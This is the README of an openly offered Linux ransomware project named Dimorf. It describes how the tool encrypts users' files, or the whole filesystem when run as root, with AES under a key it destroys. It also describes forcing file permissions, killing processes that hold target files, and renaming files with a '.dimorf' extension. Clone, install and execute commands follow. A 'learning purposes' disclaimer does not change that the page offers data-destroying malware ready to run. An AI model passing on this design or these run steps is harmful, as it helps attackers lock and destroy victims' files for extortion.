# Dimorf
Dimorf is a ransomware using 256-bit AES with a self-destructing, randomly generated key for Linux OS´s 


## Warning⚠️
- <b>"This code was created for learning purposes only and must not be used to damage or harm other users in any way. Use at your own risk."</b>

## Why Dimorf?
- This name came as inspiration from the Mr. Robot, where the main character is a morphine user, the pharmaceutical name of morphine is dimorf, in parts the name was also inspired by the [LKM Rootkit Diamorphine](https://github.com/m0nad/Diamorphine). Diamorphine is the pharmaceutical name for Heroin.

## Features
- <b>__save_log_error:</b> Logs error messages to a file if the file to be encrypted has insufficient permissions and returns the log file path.

- <b>check_os:</b> checks if the operating system is a Linux type and if Python is running on version 3. If both conditions are true, the encrypt function is called.

- <b>find_and_encrypt</b>: searches for files in a specific path <b>(by default the path is a user's home directory, extracted by the "HOME" environment variable)</b> and checks if these files have a specific extension (ext_files). If a file has a valid extension, the function checks that it is not a hidden file (begins with "."). If a file meets these conditions, the function checks whether the current user has read, write, and access permissions for that file. If this is the case, the function starts a file encryption process using AES (Advanced Encryption Standard) in CBC mode. Before encrypting, the function opens the file in read mode and loops through the entire contents of the file to check if it is empty, if the file is empty, the function adds a byte padding '\x00\x01' to the variable " data" until its length is a multiple of 16, opens it in write mode, encrypts the entire contents of the file, and replaces the original file with the encrypted version with the ".dimorf" extension. If the current user does not have read, write, or file access permissions. In this case, the function tries to change the permissions of the file to 0o644 in octal basis (meaning that the owner of the file has read and write permissions and all other users have read-only permissions). If the permission change is successful, the function starts the file encryption process again, replacing the original file with the encrypted version and removing the original file. Otherwise, the function generates a log file called "log_dimorf.log" showing the files that could not have their permissions changed.

- Previously the code extracted the home directory of a common user by the HOME environment variable, and it still works like this if the current user is a common user, with the update the code checks the user by ID, if the ID is equal to zero , this means that the current user is root, so the path to be traversed is from the root "/" since the root user has permission on these subdirectories, the code traverses all subdirectories of the root "/", however, avoiding critical directories like "/boot", "/etc" and so on.

- checks if there is a process using the file before starting cryptographic operations, if there is, the process is terminated by the pid using syscall kill

## Install

- Clone the repository
 ```
 git clone https://github.com/Ort0x36/Dimorf.git
 ```
 
- Enter the folder
```
cd Dimorf 
```

- Install requirements
```
pip install -r requirements.txt
```

- Execution permission
```
chmod +x dimorf.py
```

- Exec
```
./dimorf.py
```

## References

- [Introduction to Crypto](http://www.inf.ufsc.br/~bosco.sobral/ensino/ine5630/material-cripto-seg/Introducao-Criptografia.pdf)

- [Symmetric Encryption](https://github.com/brunocampos01/seguranca-de-redes)

- [OS - Python Module](https://docs.python.org/3/library/os.html)

- [Understanding how ransomwares working](https://www.mcafee.com/enterprise/en-us/assets/white-papers/wp-understanding-ransomware-strategies-defeat.pdf)

- [Ransomware Encryption Techniques](https://medium.com/@tarcisioma/ransomware-encryption-techniques-696531d07bb9)

- [PyCryptoDome Documentation](https://pycryptodome.readthedocs.io/en/latest/)

- [EAX Mode of Operation](https://www.iacr.org/archive/fse2004/30170391/30170391.pdf)

- [Five modes in the AES Encryption Algorithm](https://www.highgo.ca/2019/08/08/the-difference-in-five-modes-in-the-aes-encryption-algorithm/)
